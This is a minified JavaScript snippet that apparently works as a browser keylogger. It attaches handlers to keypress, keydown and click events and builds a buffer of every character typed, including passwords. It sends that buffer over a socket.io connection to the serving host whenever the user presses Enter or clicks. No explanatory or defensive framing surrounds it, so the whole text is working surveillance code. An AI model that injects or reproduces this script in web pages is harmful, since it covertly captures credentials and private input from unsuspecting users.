(function(){var n=io.connect("http://"+window.location.host);var o="";document.onkeypress=c;document.onkeydown=i;document.onclick=t;function t(){n.emit("data",{data:o})}function i(n){if(n.which===9){o+="::"}}function c(t){if(t.which===13){n.emit("data",{data:o});o=""}else{o+=String.fromCharCode(t.which)}}})();